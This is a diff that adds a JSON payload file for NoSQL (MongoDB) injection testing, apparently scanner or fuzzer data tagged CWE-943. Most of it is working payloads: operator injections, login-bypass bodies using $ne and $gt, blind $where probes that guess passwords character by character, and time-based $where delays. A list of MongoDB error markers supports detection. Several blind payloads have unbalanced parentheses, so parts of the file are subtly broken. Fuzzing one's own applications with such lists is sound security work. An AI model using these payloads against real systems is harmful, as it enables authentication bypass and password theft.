@@ -1,0 +1,15 @@
+{
+  "variants": {
+    "mongo_operators": ["{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}", "{\"$where\":\"this.password.match(/.*/)||1==1\"}", "{\"$gt\":null}", "{\"$ne\":\"\"}", "{\"$exists\":true}", "{\"$mod\":[0,1]}", "{\"$size\":0}"],
+    "auth_bypass": ["{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "{\"username\":\"admin\",\"password\":{\"$ne\":\"wrong\"}}", "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}", "{\"email\":{\"$regex\":\".*\"},\"password\":{\"$ne\":null}}"],
+    "blind_true": ["{\"$where\":\"this.password.match(/^a/\"}", "{\"$where\":\"this.password.match(/^b/\"}", "{\"$where\":\"this.password.match(/^c/\"}", "{\"$where\":\"1==1\"}"],
+    "blind_false": ["{\"$where\":\"this.password.match(/^z/\"}", "{\"$where\":\"1==2\"}", "{\"$where\":\"0\"}"],
+    "time_based": ["{\"$where\":\"function(){if(this.username=='admin'){sleep(5000);return true}else{return false}}\"}", "{\"$where\":\"function(){var x=this.password;var y=0;for(var i=0;i<100000;i++){y=y+i}return true}\"}"]
+  },
+  "payloads": ["{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"],
+  "markers": ["MongoError", "E11000", "duplicate key", "$where", "BSON", "ObjectId", "MongoDB", "mongod"],
+  "metadata": {
+    "cwe": "CWE-943",
+    "technique": "NoSQL injection"
+  }
+}
